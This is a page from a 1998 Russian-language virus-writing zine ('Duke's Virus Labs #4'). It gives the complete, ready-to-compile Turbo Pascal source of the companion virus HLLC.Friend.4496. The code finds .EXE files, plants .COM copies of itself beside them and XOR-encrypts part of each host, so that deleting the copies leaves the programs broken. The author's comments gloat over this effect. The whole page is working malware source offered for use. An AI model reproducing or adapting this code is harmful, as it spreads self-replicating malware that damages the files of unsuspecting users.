- [Duke's Virus Labs #4] - [Page 03] -

HLLC.Friend.4496
(c) by Duke/SMF


Имя вируса    : HLLC.Friend.4496 aka Friend-4
Автор         : Duke/SMF
Язык прогр.   : Turbo Pascal 7.0
Дата создания : 16.12.98

  Очередной вариант HLLC-вируса Friend. На этот раз вирус не дописывает
мусор в конец, длина его постоянная. Зато он шифрует кусок жертвы :)
Представляете - юзер видит кучу идентичных файлов одинаковой длины и стирает
их. А жертвы-то остаются зашифрованы ! Шифрование примитивное (ксорка),
но положение шифруемого куска изменяется от файла к файлу (правда, формула
не секретная ;))

===== Cut here =====
{$M 10000, 3000, 10000}
{$I-,S-}
uses dos;
const virsize=4496;                         {длина вируса}
      e='.EXE';                       {расширение (обязятельно заглавными)}
var  ds:dirstr;
     ns:namestr;
     es:extstr;
     g:file;
     mas:array[1..virsize] of char;         {тело вируса}
     st:string;
     par:string;                            {параметры командной строки}
     i:integer;
     ch:byte;
{----------------------------------------------------------------------------}
procedure Crypt(n:string);                  {шифрование жертвы}
const CS=2000;
var c:file;                                 {шифруемый файл}
    attr:word;                              {атрибуты файла}
    t:array[1..CS] of byte;                 {шифруемый массив}
begin
assign(c,n);
getfattr(c,attr);                           {сохраняем атрибуты}
setfattr(c,$20);
reset(c,1);

seek(c,200);                                {прикладываем героические усилия}
blockread(c,ch,1);                          { для вычисления начальной }
for i:=1 to 10 do                           { позиции шифрования жертвы}
  begin
  seek(c,ch+1);
  blockread(c,ch,1);
  end;
seek(c,ch+300);

blockread(c,t,CS);                          {читаем кусок из середины}
for i:=1 to CS do t[i]:=t[i] xor 99;        {шифруем этот кусок}
seek(c,ch+300);
blockwrite(c,t,CS);                         {записываем кусок}
close(c);
setfattr(c,attr);                           {возвращаем атрибуты}

end;
{----------------------------------------------------------------------------}
procedure Zar(n:string);                    {процедура заражения}
begin
fsplit(n,ds,ns,es);
st:=ds+ns+'.COM';
assign(g,st);{$I-}reset(g,1);{$I+}          {Проверяем, есть ли уже файл}
                                            {с расширением COM}
if ioresult<>0 then                         {Если нет => ещё не заражен...}
  begin
  rewrite(g,1);                             {... создаем компаньон}
  blockwrite(g,mas,virsize);                {... пишем вирус}
  Crypt(n);                                 {шифруем жертву}
  end;
close(g);
end;
{-----------------------------------------------------------------------------}
procedure Find;                             {поиск потенциальных жертв}
var s:searchrec;
    f:file;
begin
{filemode:=0;}
assign(f,paramstr(0));
reset(f,1);
blockread(f,mas,virsize);                   {считываем вирус в память}
close(f);
findfirst('*'+e,$21,s);                     {ищем жертвы...}
while doserror=0 do
  begin                                     {если длина файла более 3000,}
  if s.size>3000 then zar(s.name);          { то вызываем заражение}
  findnext(s);                              {снова ищем...}
  end;
end;
{-----------------------------------------------------------------------------}
begin
asm
  jmp @1
  db  '[Friend-4, Duke/SMF]'
  @1:
end;
fsplit(paramstr(0),ds,ns,es);
if es=e then Find          {если мы в exe-файле,то переходим к заражению}
else
  begin
  st:=ds+ns+e;
  assign(g,st);{$I-}reset(g);{$I+}
  if ioresult<>0 then Find {если не найден пораженный файл,то заражаем всех}
  else
    begin
    close(g);
    par:='';
    for i:=1 to paramcount do
      par:=par+' '+paramstr(i);
    Crypt(st);                              {расшифровываем жертву}
    exec(st,par);                           {запускаем жертву}
    Crypt(st);                              {зашифровываем обратно :)}
    end
  end
end.
===== Cut here =====

